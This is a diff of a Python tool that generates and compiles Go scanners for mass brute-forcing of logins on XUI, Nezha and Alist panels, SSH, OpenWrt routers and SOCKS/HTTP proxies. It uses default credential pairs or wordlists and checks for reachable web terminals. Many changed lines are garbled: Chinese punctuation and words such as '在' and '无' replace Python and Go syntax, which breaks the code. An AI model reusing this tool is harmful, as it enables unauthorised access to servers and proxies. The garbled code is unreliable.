@@ -505,8 +505,8 @@ XUI_GO_TEMPLATE_7_LINES = [
     "	scanner := bufio.NewScanner(batch)",
     "	for scanner.Scan() {",
     "		line := strings.TrimSpace(scanner.Text())",
-    "		if line != \"\" { tasks <- line }",
-    "	}",
+    "		if line != \"\" { tasks <- line }"，
+    "	}"，
     "	close(tasks)",
     "	wg.Wait()",
     "}",
@@ -689,8 +689,8 @@ PROXY_GO_TEMPLATE_LINES = [
     "		for _, cred := range credentials {",
     "			if found { return }",
     "			parts := strings.SplitN(cred, \":\", 2)",
-    "			if len(parts) == 2 {",
-    "				auth := &proxy.Auth{User: parts[0], Password: parts[1]}",
+    "			if len(parts) == 2 {"，
+    "				auth := &proxy.Auth{User: parts[0], Password: parts[1]}"，
     "				checkAndFormat(auth)",
     "			}",
     "		}",
@@ -707,8 +707,8 @@ PROXY_GO_TEMPLATE_LINES = [
     "	body, err := ioutil.ReadAll(resp.Body)",
     "	if err != nil { return \"\", err }",
     "	ipString := string(body)",
-    "	if strings.Contains(ipString, \"当前 IP：\") {",
-    "		parts := strings.Split(ipString, \"：\")",
+    "	if strings.Contains(ipString, \"当前 IP：\") {"，
+    "		parts := strings.Split(ipString, \"：\")"，
     "		if len(parts) > 1 {",
     "			ipParts := strings.Split(parts[1], \" \")",
     "			return ipParts[0], nil",
@@ -865,82 +865,82 @@ ALIST_GO_TEMPLATE_LINES = [
     "		req.Header.Set(\"User-Agent\", \"Mozilla/5.0\")",
     "		req.Header.Set(\"Connection\", \"close\")",
     "		resp, err := httpClient.Do(req)",
-    "       cancel()",
-    "		if err != nil {",
+    "       cancel()"，
+    "		if err != nil {"，
     "			if resp != nil { resp.Body.Close() }",
-    "			continue",
-    "		}",
-    "		if isValidResponse(resp) {",
+    "			continue"，
+    "		}"，
+    "		if isValidResponse(resp) {"，
     "			file.WriteString(base + \"\\n\")",
     "			resp.Body.Close()",
     "			return",
     "		}",
-    "		resp.Body.Close()",
+    "		resp.Body.Close()"，
     "	}",
-    "}",
-    "func isValidResponse(resp *http.Response) bool {",
-    "	if resp == nil { return false }",
+    "}"，
+    "func isValidResponse(resp *http.Response) bool {"，
+    "	if resp == nil { return false }"，
     "	body, err := io.ReadAll(io.LimitReader(resp.Body, 256*1024))",
     "	if err != nil { return false }",
     "	var data map[string]interface{}",
     "	if err := json.Unmarshal(body, &data); err != nil { return false }",
     "	if v, ok := data[\"code\"]; ok {",
     "		switch t := v.(type) {",
-    "		case float64:",
+    "		case float64:"，
     "			return int(t) == 200",
-    "		case string:",
-    "			return t == \"200\"",
+    "		case string:"，
+    "			return t == \"200\""，
     "		}",
     "	}",
     "	return false",
     "}",
     "func main() {",
-    "	if len(os.Args) < 3 {",
+    "	if len(os.Args) < 3 {"，
     "		fmt.Println(\"Usage: ./program <inputFile> <outputFile>\")",
     "		os.Exit(1)",
-    "	}",
+    "	}"，
     "	inputFile, outputFile := os.Args[1], os.Args[2]",
-    "	batch, err := os.Open(inputFile)",
+    "	batch, err := os.Open(inputFile)"，
     "	if err != nil { return }",
-    "	defer batch.Close()",
-    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)",
+    "	defer batch.Close()"，
+    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)"，
     "	if err != nil { return }",
-    "	defer outFile.Close()",
-    "	tasks := make(chan string, {semaphore_size})",
+    "	defer outFile.Close()"，
+    "	tasks := make(chan string, {semaphore_size})"，
     "	var wg sync.WaitGroup",
     "	for i := 0; i < {semaphore_size}; i++ {",
-    "		wg.Add(1)",
-    "		go worker(tasks, outFile, &wg)",
+    "		wg.Add(1)"，
+    "		go worker(tasks, outFile, &wg)"，
     "	}",
-    "	scanner := bufio.NewScanner(batch)",
-    "	for scanner.Scan() {",
+    "	scanner := bufio.NewScanner(batch)"，
+    "	for scanner.Scan() {"，
     "		line := strings.TrimSpace(scanner.Text())",
-    "		if line != \"\" {",
-    "			fields := strings.Fields(line)",
+    "		if line != \"\" {"，
+    "			fields := strings.Fields(line)"，
     "			if len(fields) > 0 {",
-    "				tasks <- fields[0]",
+    "				tasks <- fields[0]"，
     "			}",
-    "		}",
+    "		}"，
     "	}",
     "	close(tasks)",
-    "	wg.Wait()",
-    "}",
+    "	wg.Wait()"，
+    "}"，
 ]
 
 # TCP 端口活性测试模板
 TCP_ACTIVE_GO_TEMPLATE_LINES = [
     "package main",
-    "import (",
-    "	\"bufio\"",
+    "import ("，
+    "	\"bufio\""，
     "	\"fmt\"",
     "	\"net\"",
     "	\"os\"",
     "	\"strings\"",
     "	\"sync\"",
-    "	\"time\"",
+    "	\"time\""，
     ")",
     "func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup) {",
-    "	defer wg.Done()",
+    "	defer wg.Done()"，
     "	for line := range tasks {",
     "		ipPort := strings.TrimSpace(line)",
     "		if _, _, err := net.SplitHostPort(ipPort); err != nil { continue }",
@@ -1287,7 +1287,6 @@ def analyze_panel(result_line):
     return result_line, (0, 0, "登录失败")
 
 def check_server_terminal_status(session, base_url, server_id):
-    # 此函数较为简化，仅作为示例
     try:
         res = session.get(f"{base_url}/dashboard/terminal/{server_id}", timeout=5, verify=False)
         return res.status_code == 200 and "xterm" in res.text.lower()
@@ -1348,8 +1347,27 @@ def generate_go_code(go_file_name, template_lines, **kwargs):
 def compile_go_program(go_file, executable_name):
     if sys.platform == "win32": executable_name += ".exe"
     print(f"📦 [编译] 正在编译Go程序 {go_file} -> {executable_name}...")
+    
+    # 为编译创建一个安全的环境
+    build_env = os.environ.copy()
+    temp_home_created = False
+    if 'HOME' not in build_env:
+        temp_home = os.path.join(os.getcwd(), ".gohome_build")
+        os.makedirs(temp_home, exist_ok=True)
+        build_env['HOME'] = temp_home
+        print(f"   - ⚠️  未定义 HOME 变量，临时设置为: {temp_home}")
+        temp_home_created = True
+
+    if 'GOCACHE' not in build_env:
+        build_env['GOCACHE'] = os.path.join(build_env['HOME'], ".cache", "go-build")
+
     try:
-        process = subprocess.run([GO_EXEC, 'build', '-ldflags', '-s -w', '-o', executable_name, go_file], check=True, capture_output=True)
+        subprocess.run(
+            [GO_EXEC, 'build', '-ldflags', '-s -w', '-o', executable_name, go_file], 
+            check=True, 
+            capture_output=True, 
+            env=build_env
+        )
         print(f"✅ [编译] Go程序编译成功: {executable_name}")
         return executable_name
     except (subprocess.CalledProcessError, FileNotFoundError) as e:
@@ -1359,6 +1377,9 @@ def compile_go_program(go_file, executable_name):
         else:
             print(f"   - 错误输出:\n{e.stderr.decode('utf-8', 'ignore')}")
         sys.exit(1)
+    finally:
+        if temp_home_created and 'temp_home' in locals():
+             shutil.rmtree(temp_home, ignore_errors=True)
 
 def adjust_oom_score():
     if sys.platform != "linux": return
@@ -1420,13 +1441,23 @@ def is_in_china():
 
 def check_environment(template_mode, is_china_env):
     print(">>> 正在检查依赖环境...")
-    # 仅检查和安装Go模块
+    
     go_env = os.environ.copy()
+    temp_home_created = False
+    if 'HOME' not in go_env:
+        temp_home = os.path.join(os.getcwd(), ".gohome_env_check")
+        os.makedirs(temp_home, exist_ok=True)
+        go_env['HOME'] = temp_home
+        print(f"   - ⚠️  未定义 HOME 变量，临时设置为: {temp_home}")
+        temp_home_created = True
+
     go_env['GOPROXY'] = 'https://goproxy.cn,direct' if is_china_env else 'https://proxy.golang.org,direct'
-    if 'HOME' not in go_env: go_env['HOME'] = '/tmp'
-    if 'GOCACHE' not in go_env: go_env['GOCACHE'] = '/tmp/.cache/go-build'
+    if 'GOCACHE' not in go_env:
+        go_env['GOCACHE'] = os.path.join(go_env['HOME'], ".cache", "go-build")
     
     try:
+        subprocess.run([GO_EXEC, "version"], check=True, capture_output=True)
+
         if not os.path.exists("go.mod"):
             subprocess.run([GO_EXEC, "mod", "init", "xui"], check=True, capture_output=True, env=go_env)
         
@@ -1439,12 +1470,16 @@ def check_environment(template_mode, is_china_env):
             for pkg in required_pkgs:
                 subprocess.run([GO_EXEC, "get", pkg], check=True, capture_output=True, env=go_env)
             print("    - ✅ Go模块安装完成。")
+            
     except (FileNotFoundError, subprocess.CalledProcessError) as e:
         print("\n❌ Go环境配置失败。请确保Go语言已正确安装并位于系统PATH中。")
         if isinstance(e, subprocess.CalledProcessError):
             print(f"   - 错误详情: {e.stderr.decode('utf-8', 'ignore')}")
         sys.exit(1)
-    
+    finally:
+        if temp_home_created and 'temp_home' in locals():
+            shutil.rmtree(temp_home, ignore_errors=True)
+
     print(">>> ✅ 环境依赖检测完成 ✅ <<<\n")
 
 
@@ -1456,11 +1491,11 @@ def process_chunk(chunk_id, lines, executable_name):
         cmd = ['./' + executable_name, input_file, output_file]
         process = subprocess.run(cmd, capture_output=True, check=False)
         if process.returncode != 0:
-            if process.returncode in [-9, 137]:
-                return (False, f"任务 {chunk_id} 被系统因内存不足而终止(OOM Killed)。")
+            if process.returncode 在 [-9, 137]:
+                return (False， f"任务 {chunk_id} 被系统因内存不足而终止(OOM Killed)。")
             else:
-                return (False, f"任务 {chunk_id} 失败，返回码 {process.returncode}。\n错误信息:\n{process.stderr.decode('utf-8', 'ignore')}")
-        return (True, None)
+                return (False, f"任务 {chunk_id} 失败，返回码 {process.returncode}。\n错误信息:\n{process.stderr。decode('utf-8'， 'ignore')}")
+        return (True， 无)
     finally:
         if os.path.exists(input_file): os.remove(input_file)
 
@@ -1470,13 +1505,13 @@ def run_scan_in_parallel(lines, executable_name, python_concurrency, chunk_size,
     with ThreadPoolExecutor(max_workers=python_concurrency) as executor:
         future_to_chunk_id = {executor.submit(process_chunk, i, chunk, executable_name): i for i, chunk in enumerate(chunks)}
         with tqdm(total=len(chunks), desc=desc, ncols=100) as pbar:
-            for future in as_completed(future_to_chunk_id):
+            for future 在 as_completed(future_to_chunk_id):
                 chunk_id = future_to_chunk_id[future]
                 try:
                     success, error_message = future.result()
                     if not success:
                         print(f"\n❌ {error_message}")
-                        if "OOM" in error_message:
+                        if "OOM" 在 error_message:
                             executor.shutdown(wait=False, cancel_futures=True)
                             raise SystemExit("内存不足，脚本已中止。")
                 except Exception as exc:
@@ -1500,15 +1535,15 @@ def run_ipcx(final_result_file, xlsx_output_file):
 
 def clean_temp_files():
     print("🗑️  [清理] 正在删除临时文件...")
-    for d in [TEMP_PART_DIR, TEMP_XUI_DIR, TEMP_EXPAND_DIR, TEMP_PRESCAN_DIR]:
+    for d 在 [TEMP_PART_DIR, TEMP_XUI_DIR, TEMP_EXPAND_DIR, TEMP_PRESCAN_DIR]:
         shutil.rmtree(d, ignore_errors=True)
     files_to_remove = [
-        'xui.go', 'subnet_scanner.go', 'ipcx.py', 'go.mod', 'go.sum', 'tcp_prescan.go',
+        'xui.go'， 'subnet_scanner.go'， 'ipcx.py', 'go.mod', 'go.sum', 'tcp_prescan.go',
         'xui_executable', 'xui_executable.exe',
         'subnet_scanner_executable', 'subnet_scanner_executable.exe',
         'tcp_prescan_executable', 'tcp_prescan_executable.exe'
     ]
-    for f in files_to_remove:
+    for f 在 files_to_remove:
         if os.path.exists(f):
             try: os.remove(f)
             except OSError: pass
@@ -1518,15 +1553,15 @@ def choose_template_mode():
     print("请选择爆破模式：\n1. XUI面板\n2. 哪吒面板\n3. SSH\n4. Sub Store\n5. OpenWrt/iStoreOS\n--- 代理模式 ---\n6. SOCKS5 代理\n7. HTTP 代理\n8. HTTPS 代理\n--- 其他面板 ---\n9. Alist 面板\n10. TCP 端口活性检测")
     choices = {"1": 1, "2": 2, "3": 6, "4": 7, "5": 8, "6": 9, "7": 10, "8": 11, "9": 12, "10": 13}
     while True:
-        choice = input("输入 1-10 之间的数字 (默认: 1)：").strip() or "1"
-        if choice in choices: return choices[choice]
+        choice = input("输入 1-10 之间的数字 (默认: 1)：")。strip() or "1"
+        if choice 在 choices: return choices[choice]
         print("❌ 输入无效，请重新输入。")
 
 def load_credentials(template_mode):
-    if template_mode in [7, 12, 13]: return [], [], [] # No creds needed
+    if template_mode 在 [7， 12, 13]: return [], [], [] # No creds needed
     use_custom = input("是否使用 username.txt / password.txt 字典库？(y/N，使用内置默认值): ").strip().lower()
     if use_custom == 'y':
-        if not os.path.exists("username.txt") or not os.path.exists("password.txt"):
+        if not os.path。exists("username.txt") 或 not os.path。exists("password.txt"):
             print("❌ 错误: 缺少 username.txt 或 password.txt 文件。"); sys.exit(1)
         with open("username.txt", 'r', encoding='utf-8-sig', errors='ignore') as f:
             usernames = [line.strip() for line in f if line.strip()]
@@ -1539,6 +1574,21 @@ def load_credentials(template_mode):
         return usernames, passwords, []
     else:
         return ["root"] if template_mode == 8 else ["admin"], ["password"] if template_mode == 8 else ["admin"], []
+
+def parse_result_line(line):
+    proxy_match = re.match(r'(\w+)://(?:([^:]+):([^@]+)@)?([\d\.]+):(\d+)', line)
+    if proxy_match:
+        user, password, ip, port = proxy_match.group(2) or '', proxy_match.group(3) or '', proxy_match.group(4), proxy_match.group(5)
+        return ip, port, user, password
+    parts = line.split()
+    if len(parts) >= 1:
+        ip_port = parts[0]
+        user = parts[1] if len(parts) > 1 else ''
+        password = parts[2] if len(parts) > 2 else ''
+        if ':' in ip_port:
+            ip, port = ip_port.split(':', 1)
+            return ip, port, user, password
+    return None, None, None, None
 
 def scan_single_cluster(cluster_info):
     cluster_id, subnet_prefix, port, user, password, subnet_size, subnet_scanner_executable, _ = cluster_info
